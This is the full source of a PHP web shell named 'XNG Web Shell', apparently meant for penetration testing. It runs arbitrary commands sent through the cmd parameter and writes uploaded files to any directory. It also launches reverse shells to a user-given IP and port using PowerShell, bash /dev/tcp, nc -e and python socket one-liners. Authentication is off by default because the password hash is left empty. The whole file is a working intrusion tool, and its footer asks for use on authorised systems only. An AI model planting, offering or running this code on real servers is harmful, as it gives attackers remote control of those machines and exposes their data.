<?php
/**
 *  PHP Web Shell
 * Combines WhiteWinterWolf's reliability with modern UI
 * Supports Windows, Linux, macOS
 */

// ============================================
// CONFIGURATION
// ============================================
$passprompt = "XNG Web Shell Password: ";
$passhash = ""; // Set your password hash here for authentication

// ============================================
// CORE FUNCTIONS
// ============================================
function e($s) { echo htmlspecialchars($s, ENT_QUOTES); }

function h($s) {
    global $passprompt;
    if (function_exists('hash_hmac')) {
        return hash_hmac('sha256', $s, $passprompt);
    } elseif (function_exists('mhash')) {
        return bin2hex(mhash(MHASH_SHA256, $s, $passprompt));
    }
    return '';
}

function run_cmd($cmd) {
    $output = '';
    if (DIRECTORY_SEPARATOR == '/') {
        // Linux/Unix/macOS
        $p = popen('exec 2>&1; ' . $cmd, 'r');
    } else {
        // Windows
        $p = popen('cmd /C "' . $cmd . '" 2>&1', 'r');
    }
    if ($p) {
        while (!feof($p)) {
            $output .= fread($p, 4096);
        }
        pclose($p);
    }
    return $output;
}

function reverse_shell($ip, $port, &$status) {
    $os = DIRECTORY_SEPARATOR == '/' ? 'nix' : 'win';
    $result = '';
    
    if ($os == 'win') {
        // Windows PowerShell reverse shell
        $ps_cmd = 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command "$client = New-Object System.Net.Sockets.TCPClient(\'' . $ip . '\',' . $port . ');$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"';
        if (DIRECTORY_SEPARATOR == '/') {
            exec($ps_cmd . ' > /dev/null 2>&1 &');
        } else {
            pclose(popen('start /B ' . $ps_cmd, 'r'));
        }
        $result = "Windows reverse shell attempted to $ip:$port";
        $status = $result;
    } else {
        // Linux/Unix reverse shell (multiple methods)
        $cmds = [
            "bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'",
            "nc -e /bin/sh $ip $port",
            "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('$ip',$port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/sh','-i'])\""
        ];
        foreach ($cmds as $cmd) {
            exec($cmd . ' > /dev/null 2>&1 &');
        }
        $result = "Linux reverse shell attempted to $ip:$port";
        $status = $result;
    }
    return $result;
}

// ============================================
// INITIALIZATION
// ============================================
ini_set('log_errors', '0');
ini_set('display_errors', '1');
error_reporting(E_ALL);

while (@ob_end_clean());

// Superglobal compatibility
if (!isset($_SERVER)) {
    global $HTTP_POST_FILES, $HTTP_POST_VARS, $HTTP_SERVER_VARS;
    $_FILES = &$HTTP_POST_FILES;
    $_POST = &$HTTP_POST_VARS;
    $_SERVER = &$HTTP_SERVER_VARS;
}

// ============================================
// VARIABLES
// ============================================
$auth = '';
$cmd = empty($_POST['cmd']) ? (empty($_GET['cmd']) ? '' : $_GET['cmd']) : $_POST['cmd'];
$cwd = empty($_POST['cwd']) ? getcwd() : $_POST['cwd'];
$pass = empty($_POST['pass']) ? '' : $_POST['pass'];
$url = $_SERVER['REQUEST_URI'];
$status = '';
$revshell_status = '';
$cmd_output = '';

$ok = '✓';
$warn = '⚠';
$err = '✗';

// ============================================
// AUTHENTICATION
// ============================================
if (!empty($passhash)) {
    if (function_exists('hash_hmac') || function_exists('mhash')) {
        $auth = empty($_POST['auth']) ? h($pass) : $_POST['auth'];
        if (h($auth) !== $passhash) {
            ?>
            <!DOCTYPE html>
            <html>
            <head>
                <title>XNG Web Shell - Auth</title>
                <style>
                    body {
                        background: #0a0e27;
                        color: #00ff88;
                        font-family: monospace;
                        padding: 20px;
                        display: flex;
                        justify-content: center;
                        align-items: center;
                        height: 100vh;
                        margin: 0;
                    }
                    .auth-box {
                        background: rgba(10, 14, 39, 0.9);
                        border: 1px solid #00ff88;
                        padding: 30px;
                        border-radius: 10px;
                        box-shadow: 0 0 20px rgba(0,255,136,0.3);
                    }
                    input {
                        background: #1a1f3a;
                        border: 1px solid #00ff88;
                        color: #00ff88;
                        padding: 10px;
                        margin: 10px 0;
                        width: 200px;
                    }
                    button {
                        background: #00ff88;
                        color: #0a0e27;
                        border: none;
                        padding: 10px 20px;
                        cursor: pointer;
                        font-weight: bold;
                    }
                </style>
            </head>
            <body>
                <div class="auth-box">
                    <h2>🔐 <?php e($passprompt); ?></h2>
                    <form method="post" action="<?php e($url); ?>">
                        <input type="password" name="pass" placeholder="Password" autofocus><br>
                        <button type="submit">Authenticate</button>
                    </form>
                </div>
            </body>
            </html>
            <?php
            exit;
        }
    }
}

// ============================================
// CHANGE DIRECTORY
// ============================================
if (!chdir($cwd)) {
    $cwd = getcwd();
}

// ============================================
// HANDLE REVERSE SHELL
// ============================================
if (isset($_POST['revshell'])) {
    $rip = $_POST['rip'] ?? '';
    $rport = $_POST['rport'] ?? '443';
    if (!empty($rip) && is_numeric($rport)) {
        reverse_shell($rip, (int)$rport, $revshell_status);
    } else {
        $revshell_status = "Invalid IP or Port!";
    }
}

// ============================================
// HANDLE COMMAND EXECUTION
// ============================================
if (!empty($cmd)) {
    $cmd_output = run_cmd($cmd);
}

// ============================================
// HANDLE FILE UPLOAD
// ============================================
$upload_status = '';
if (ini_get('file_uploads') && !empty($_FILES['upload'])) {
    $dest = $cwd . DIRECTORY_SEPARATOR . basename($_FILES['upload']['name']);
    if (move_uploaded_file($_FILES['upload']['tmp_name'], $dest)) {
        $upload_status = "{$ok} Uploaded: " . basename($_FILES['upload']['name']) . " (" . $_FILES['upload']['size'] . " bytes)";
    } else {
        $upload_status = "{$err} Upload failed!";
    }
}

// ============================================
// GET SYSTEM INFO
// ============================================
$os_type = DIRECTORY_SEPARATOR == '/' ? '' : 'Windows';
$current_user = function_exists('exec') ? exec('whoami') : (function_exists('shell_exec') ? shell_exec('whoami') : 'unknown');
$hostname = function_exists('exec') ? exec('hostname') : (function_exists('shell_exec') ? shell_exec('hostname') : 'unknown');
?>

<!DOCTYPE html>
<html>
<head>
    <title>XNG Web Shell  </title>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0e27 0%, #1a1f3a 100%);
            color: #00ff88;
            font-family: 'Courier New', 'Fira Code', monospace;
            padding: 20px;
            min-height: 100vh;
        }
        
        .container {
            max-width: 1400px;
            margin: 0 auto;
        }
        
        h1 {
            font-size: 2em;
            margin-bottom: 10px;
            background: linear-gradient(135deg, #00ff88, #00bfff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }
        
        .info-bar {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
            gap: 15px;
            margin: 20px 0;
            padding: 15px;
            background: rgba(0, 0, 0, 0.3);
            border-radius: 10px;
            border: 1px solid #00ff8822;
        }
        
        .info-item {
            font-size: 12px;
        }
        
        .info-item span {
            color: #ffd700;
        }
        
        .card {
            background: rgba(10, 14, 39, 0.6);
            border: 1px solid #2a2f4a;
            border-radius: 10px;
            padding: 20px;
            margin-bottom: 20px;
            transition: all 0.3s;
        }
        
        .card:hover {
            border-color: #00ff88;
            box-shadow: 0 0 10px rgba(0,255,136,0.1);
        }
        
        .card h2 {
            color: #00bfff;
            margin-bottom: 15px;
            font-size: 1.2em;
            border-left: 3px solid #00ff88;
            padding-left: 12px;
        }
        
        .card h3 {
            color: #ffd700;
            font-size: 0.9em;
            margin: 10px 0;
        }
        
        input, select, .file-input {
            background: #0a0e27;
            border: 1px solid #2a2f4a;
            color: #00ff88;
            padding: 10px;
            margin: 8px 0;
            width: 100%;
            font-family: monospace;
            border-radius: 5px;
        }
        
        input:focus {
            outline: none;
            border-color: #00ff88;
        }
        
        button, .btn {
            background: linear-gradient(135deg, #00ff88, #00bfff);
            color: #0a0e27;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-weight: bold;
            font-family: monospace;
            transition: transform 0.2s;
        }
        
        button:hover {
            transform: scale(1.02);
        }
        
        pre {
            background: #0a0e27;
            padding: 15px;
            border-radius: 5px;
            overflow-x: auto;
            margin-top: 15px;
            border-left: 3px solid #00ff88;
            color: #00ff88;
            font-size: 13px;
        }
        
        .status {
            margin-top: 10px;
            padding: 10px;
            background: rgba(0,255,136,0.1);
            border-radius: 5px;
            font-size: 12px;
        }
        
        .status-error {
            background: rgba(255,0,0,0.1);
            color: #ff6666;
        }
        
        .status-success {
            background: rgba(0,255,136,0.15);
        }
        
        hr {
            border-color: #2a2f4a;
            margin: 20px 0;
        }
        
        .footer {
            text-align: center;
            margin-top: 30px;
            padding: 20px;
            font-size: 11px;
            color: #8892b0;
            border-top: 1px solid #2a2f4a;
        }
        
        .grid-2 {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
        }
        
        @media (max-width: 768px) {
            .grid-2 {
                grid-template-columns: 1fr;
            }
            body {
                padding: 10px;
            }
        }
        
        .cwd-input {
            font-size: 13px;
        }
        
        .inline-input {
            display: flex;
            gap: 10px;
            align-items: center;
        }
        
        .inline-input input {
            flex: 1;
        }
        
        .inline-input button {
            width: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>XNG Web Shell  </h1>
        
        <!-- System Info -->
        <div class="info-bar">
            <div class="info-item"><span>🖥️ OS:</span> <?php e($os_type); ?></div>
            <div class="info-item"><span>👤 User:</span> <?php e($current_user); ?></div>
            <div class="info-item"><span>🏠 Hostname:</span> <?php e($hostname); ?></div>
            <div class="info-item"><span>📁 CWD:</span> <?php e($cwd); ?></div>
            <div class="info-item"><span>🐘 PHP:</span> <?php e(phpversion()); ?></div>
        </div>
        
        <?php if (!empty($status)): ?>
            <div class="status"><?php echo $status; ?></div>
        <?php endif; ?>
        
        <?php if (!empty($upload_status)): ?>
            <div class="status status-success"><?php echo $upload_status; ?></div>
        <?php endif; ?>
        
        <div class="grid-2">
            <!-- Left Column -->
            <div>
                <!-- Command Execution -->
                <div class="card">
                    <h2>💻 Command Execution</h2>
                    <form method="POST">
                        <?php if (!empty($passhash)): ?>
                            <input type="hidden" name="auth" value="<?php e($auth); ?>">
                        <?php endif; ?>
                        <input type="hidden" name="cwd" value="<?php e($cwd); ?>">
                        <input type="text" name="cmd" placeholder="Enter command (e.g., whoami, id, ls -la, dir)" 
                               value="<?php e($cmd); ?>" autofocus>
                        <button type="submit">▶ Execute</button>
                    </form>
                    <?php if (!empty($cmd_output)): ?>
                        <pre><?php e($cmd_output); ?></pre>
                    <?php endif; ?>
                </div>
                
                <!-- File Upload -->
                <?php if (ini_get('file_uploads')): ?>
                <div class="card">
                    <h2>📤 File Upload</h2>
                    <form method="POST" enctype="multipart/form-data">
                        <?php if (!empty($passhash)): ?>
                            <input type="hidden" name="auth" value="<?php e($auth); ?>">
                        <?php endif; ?>
                        <input type="hidden" name="cwd" value="<?php e($cwd); ?>">
                        <input type="file" name="upload" style="background:#0a0e27; border:1px solid #2a2f4a;">
                        <button type="submit">📂 Upload File</button>
                    </form>
                </div>
                <?php endif; ?>
            </div>
            
            <!-- Right Column -->
            <div>
                <!-- Reverse Shell -->
                <div class="card">
                    <h2>🔌 Reverse Shell</h2>
                    <form method="POST">
                        <?php if (!empty($passhash)): ?>
                            <input type="hidden" name="auth" value="<?php e($auth); ?>">
                        <?php endif; ?>
                        <input type="hidden" name="cwd" value="<?php e($cwd); ?>">
                        <div class="inline-input">
                            <input type="text" name="rip" placeholder="LHOST (Your IP)" value="10.10.14.29">
                            <input type="text" name="rport" placeholder="LPORT" value="443">
                        </div>
                        <button type="submit" name="revshell" value="1">🚀 Send Reverse Shell</button>
                    </form>
                    <?php if (!empty($revshell_status)): ?>
                        <div class="status status-success"><?php e($revshell_status); ?></div>
                    <?php endif; ?>
                    <div class="status" style="margin-top: 10px;">
                        💡 Start listener: <code style="color:#ffd700;">nc -lvnp 443</code>
                    </div>
                </div>
                
                <!-- Current Directory / Navigation -->
                <div class="card">
                    <h2>📁 Change Directory</h2>
                    <form method="POST">
                        <?php if (!empty($passhash)): ?>
                            <input type="hidden" name="auth" value="<?php e($auth); ?>">
                        <?php endif; ?>
                        <div class="inline-input">
                            <input type="text" name="cwd" class="cwd-input" placeholder="Directory path" 
                                   value="<?php e($cwd); ?>">
                            <button type="submit">📂 CD</button>
                        </div>
                    </form>
                    <div class="status" style="margin-top: 10px;">
                        📍 Current: <?php e($cwd); ?>
                    </div>
                </div>
            </div>
        </div>
        
        <div class="footer">
            Use responsibly on authorized systems only
        </div>
    </div>
</body>
</html>
